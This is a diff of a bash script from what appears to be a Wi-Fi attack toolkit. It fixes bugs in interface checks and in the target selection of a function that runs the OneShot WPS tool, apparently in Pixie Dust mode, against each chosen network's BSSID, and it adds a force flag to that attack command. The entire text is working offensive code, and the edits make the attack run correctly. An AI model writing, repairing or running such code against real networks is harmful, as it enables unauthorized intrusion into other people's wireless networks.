@@ -125,12 +125,12 @@ check_ifaces(){
         second_iface_up=1
     else
         printf "\e[0m[\e[91m!\e[0m] \e[91m$second_iface\e[0m is down\n"
-        second_iface_ip=0
+        second_iface_up=0
     fi
 
-    sum_ifaces=$(expr $second_iface + $first_iface)
+    sum_ifaces=$(expr $second_iface_up + $first_iface_up)
 
-    if [[ "$first_iface" == 0 && "$second_iface" == 0 ]]; then
+    if [[ "$first_iface_up" == 0 && "$second_iface_up" == 0 ]]; then
         printf "\n\e[0m[\e[91m!\e[0m] No interfaces found!\n"
         exit
     else
@@ -169,11 +169,11 @@ wps_blackout(){
 
     if [ -z "$target_number" ];
     then
-        target_ssid=("${wps_bssid[@]}")
-        target_bssid=("${wps_ssid[@]}")
+        target_bssid=("${wps_bssid[@]}")
+        target_ssid=("${wps_ssid[@]}")
     else
-        target_ssid=($(echo $target_number | { while read -d, i; do printf "${wps_bssid[$(($i-1))]}\n"; done; printf "${wps_bssid[$(($i-1))]}\n"; }))
-        target_bssid=($(echo $target_number | { while read -d, i; do printf "${wps_ssid[$(($i-1))]}\n"; done; printf "${wps_ssid[$(($i-1))]}\n"; }))
+        target_bssid=($(echo $target_number | { while read -d, i; do printf "${wps_bssid[$(($i-1))]}\n"; done; printf "${wps_bssid[$(($i-1))]}\n"; }))
+        target_ssid=($(echo $target_number | { while read -d, i; do printf "${wps_ssid[$(($i-1))]}\n"; done; printf "${wps_ssid[$(($i-1))]}\n"; }))
     fi
 
     printf "\n[ Disconnect wifi before attack? (\e[92my\e[0m/\e[92mn\e[0m): ]\n\n"
@@ -206,7 +206,7 @@ wps_blackout(){
     do  
         printf "\n\e[0m[\e[93m*\e[0m] ($((y+1))/${#target_bssid[@]}) Attacking ${target_ssid[$y]} (${target_bssid[$y]})\n\n"
         
-        python3 $(pwd)/config/OneShot/oneshot.py -i $first_iface -b ${target_bssid[$y]} -K -w
+        python3 $(pwd)/config/OneShot/oneshot.py -i $first_iface -b ${target_bssid[$y]} -K -F -w
         
         printf "\n\n\e[0m[\e[92mi\e[0m] Press [ENTER] to continue...\n"
         read ener_empty_value
